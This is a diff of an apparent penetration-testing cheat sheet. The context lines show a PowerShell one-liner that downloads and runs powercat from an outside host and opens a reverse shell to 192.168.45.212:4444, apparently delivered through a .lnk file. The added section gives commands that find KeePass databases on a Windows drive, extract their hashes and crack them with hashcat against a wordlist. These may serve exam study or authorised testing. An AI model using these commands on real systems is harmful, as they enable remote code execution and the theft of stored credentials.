@@ -96,3 +96,14 @@ automatic_configuration.lnk
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.212:8000/powercat.ps1');
 powercat -c 192.168.45.212 -p 4444 -e powershell"
 ```
+
+
+# Keepass
+```
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+keepass2john Database.kdbx > keepass.hash
+
+hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
+```
+
+# Password Manager
